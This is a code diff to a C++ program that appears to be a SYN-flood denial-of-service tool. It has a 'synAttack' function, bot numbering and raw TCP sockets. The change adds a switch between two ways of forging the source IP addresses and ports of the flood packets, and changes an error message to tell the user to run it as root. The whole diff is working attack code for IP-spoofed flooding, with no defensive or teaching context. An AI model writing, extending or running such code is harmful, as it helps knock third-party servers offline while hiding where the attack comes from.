@@ -19,6 +19,10 @@
 
 using namespace std;
 
+#define RANDOM_SPOOFING 1
+
+static int seed = 0xA0000000;
+
 static int botNo;
 static int offset;
 // 96 bit (12 bytes) pseudo header needed for tcp header checksum calculation 
@@ -214,20 +218,33 @@ void synAttack(string sourceIP, int sourcePort, string destIP, int destPort, int
 {
 	// Create a raw socket;
     
-    int p1=rand()%256;
-    int p2=rand()%256;
-    int p3=rand()%256;
-    int p4=rand()%256;
-    sourcePort=rand()%65536;
-    sourceIP=to_string(p1)+"."+to_string(p2)+"."+to_string(p3)+"."+to_string(p4);
+    srand(time(NULL));
+    if (RANDOM_SPOOFING==0) {
+        seed+=4;
+        int p1=seed%256;
+        int p2=(seed>>8)%256;
+        int p3=(seed>>16)%256;
+        int p4=(seed>>24)%256;
+        sourcePort=rand()%65536;
+        sourceIP=to_string(p1)+"."+to_string(p2)+"."+to_string(p3)+"."+to_string(p4);
 
+    }else{
+    
+        int p1=rand()%256;
+        int p2=rand()%256;
+        int p3=rand()%256;
+        int p4=rand()%256;
+        sourcePort=rand()%65536;
+        sourceIP=to_string(p1)+"."+to_string(p2)+"."+to_string(p3)+"."+to_string(p4);
+    
+    }
     
 	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
 
 	if(s == -1)
     {
         //socket creation failed, may be because of non-root privileges
-        cout << "Error at socket()" << endl;
+        cout << "Error at socket(), sudo !!" << endl;
 		return;
     }
 
